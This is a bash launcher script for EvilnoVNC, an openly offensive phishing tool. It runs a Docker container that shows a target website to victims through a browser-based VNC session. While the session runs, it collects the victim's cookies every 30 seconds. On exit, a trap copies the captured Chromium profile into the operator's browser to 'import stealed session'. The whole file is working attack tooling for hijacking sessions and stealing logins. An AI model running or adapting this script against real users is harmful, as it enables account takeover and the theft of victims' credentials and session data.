#!/bin/bash
#=============================#
#   EvilnoVNC by @JoelGMSec   #
#     https://darkbyte.net    #
#=============================#

# Banner
printf "\e[1;34m
  _____       _ _          __     ___   _  ____
 | ____|_   _(_) |_ __   __\ \   / / \ | |/ ___|
 |  _| \ \ / / | | '_ \ / _ \ \ / /|  \| | |
 | |___ \ V /| | | | | | (_) \ V / | |\  | |___
 |_____| \_/ |_|_|_| |_|\___/ \_/  |_| \_|\____|

\e[1;32m  ---------------- by @JoelGMSec --------------\n\e[1;0m" 

# Help & Usage
function help {
printf "\n\e[1;33mUsage:\e[1;0m  ./start.sh \e[1;35m\$resolution \e[1;34m\$url\n\n"
printf "\e[1;33mExamples:\n"
printf "\e[1;32m\t1280x720  16bits: \e[1;0m./start.sh \e[1;35m1280x720x16 \e[1;34mhttp://example.com\n"
printf "\e[1;32m\t1280x720  24bits: \e[1;0m./start.sh \e[1;35m1280x720x24 \e[1;34mhttp://example.com\n"
printf "\e[1;32m\t1920x1080 16bits: \e[1;0m./start.sh \e[1;35m1920x1080x16 \e[1;34mhttp://example.com\n"
printf "\e[1;32m\t1920x1080 24bits: \e[1;0m./start.sh \e[1;35m1920x1080x24 \e[1;34mhttp://example.com\n\n"
printf "\e[1;33mDynamic resolution:\n"
printf "\e[1;0m\t./start.sh \e[1;35mdynamic \e[1;34mhttp://example.com\n\n";}

if [[ $# -lt 2 ]] ; then help
if [[ $# -lt 2 ]] ; then printf "\e[1;31m[!] Not enough parameters!\n\n"
fi ; exit 0 ; fi

# Variables
RESOLUTION=$1
WEBPAGE=$2

# Main function
if docker -v &> /dev/null ; then
if ! (( $(ps -ef | grep -v grep | grep docker | wc -l) > 0 )) ; then
sudo service docker start > /dev/null 2>&1 ; sleep 2 ; fi ; fi

if [[ $RESOLUTION == dynamic ]]; then
sudo rm -f /tmp/resolution.txt /tmp/client_info.txt
else
echo $RESOLUTION > /tmp/resolution.txt
fi

sudo docker run --cap-add=SYS_ADMIN -d --rm -p 80:80 --shm-size=2gb -v "/tmp:/tmp" \
-v "${PWD}/Downloads":"/home/user/Downloads" -v "${PWD}/Files/kiosk.zip":"/home/user/kiosk.zip" \
-e "WEBPAGE=$WEBPAGE" -e "USERAGENT=$USERAGENT" -e "CLIENT_LANG=$CLIENT_LANG" \
--name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1

rm -Rf $PWD/Downloads/*
printf "\n\e[1;33m[>] EvilnoVNC Server is running.." ; sleep 2
printf "\n\e[1;34m[+] URL: http://localhost" ; sleep 2
printf "\n\e[1;31m[!] Press Ctrl+C at any time to close!" ; sleep 2

diagnose() {
    local label=$1
    printf "\n\e[1;36m[?] Diagnostic (%s):\e[1;0m\n" "$label"

    if [[ -z "$(sudo docker ps -q -f name=^evilnovnc$)" ]]; then
        printf "\e[1;31m  [ERR]  container 'evilnovnc' is not running\e[1;0m\n"
        local logs
        logs=$(sudo docker logs --tail 20 evilnovnc 2>&1)
        if [[ -n "$logs" && "$logs" != *"No such container"* ]]; then
            printf "\e[1;33m  [INFO] last 20 lines (exited container logs):\e[1;0m\n%s\n" "$logs"
        fi
        return
    fi

    local http
    http=$(sudo docker exec evilnovnc curl -sS -o /dev/null -w '%{http_code}' --max-time 3 http://127.0.0.1:80/ 2>&1)
    if [[ "$http" =~ ^[0-9]{3}$ ]]; then
        printf "\e[1;32m  [OK]   container :80 responds (HTTP %s)\e[1;0m\n" "$http"
    else
        printf "\e[1;31m  [ERR]  container :80 not responding\e[1;0m\n"
        printf "\e[0;90m         curl output: %s\e[1;0m\n" "$http"
    fi

    local php
    php=$(sudo docker exec evilnovnc pgrep -a php 2>/dev/null)
    if [[ -n "$php" ]]; then
        printf "\e[1;32m  [OK]   php running: %s\e[1;0m\n" "$php"
    else
        printf "\e[1;33m  [INFO] no php process (expected post-handover, ERR only during dynamic bootstrap)\e[1;0m\n"
    fi

    local socat
    socat=$(sudo docker exec evilnovnc pgrep -a socat 2>/dev/null)
    if [[ -n "$socat" ]]; then
        printf "\e[1;32m  [OK]   socat running: %s\e[1;0m\n" "$socat"
    else
        printf "\e[1;33m  [INFO] no socat process (expected during dynamic bootstrap, ERR after handover)\e[1;0m\n"
    fi

    local logs
    logs=$(sudo docker logs --tail 20 evilnovnc 2>&1)
    if [[ -n "$logs" ]]; then
        printf "\e[1;33m  [INFO] last 20 lines of docker logs:\e[1;0m\n%s\n" "$logs"
    else
        printf "\e[1;33m  [INFO] docker logs empty\e[1;0m\n"
    fi
}

diagnose "initial"
sleep 5
diagnose "after 5s"

if [[ $RESOLUTION == dynamic ]]; then
printf "\n\e[1;32m[+] Waiting for any user interaction.." ; sleep 2
while [[ -z "$(cat /tmp/resolution.txt 2> /dev/null)" ]]; do sleep 1 ; done
RESOLUTION=$(head -1 /tmp/resolution.txt)
fi
printf "\n\e[1;34m[+] Desktop Resolution: $RESOLUTION" ; sleep 2
printf "\n\e[1;32m[+] Cookies will be updated every 30 seconds.. \e[1;31m"

trap 'printf "\n\e[1;33m[>] Import stealed session to Chromium..\n" ; sleep 2
sudo docker stop evilnovnc > /dev/null 2>&1 &
rm -Rf ~/.config/chromium/Default > /dev/null 2>&1 ; cp -R Downloads/Default ~/.config/chromium/ > /dev/null 2>&1
/bin/bash -c "/usr/bin/chromium --no-sandbox --disable-crash-reporter --password-store=basic &" > /dev/null 2>&1 &
printf "\e[1;32m[+] Done!\n\e[1;0m"' SIGTERM EXIT
while true ; do sleep 30 ; done
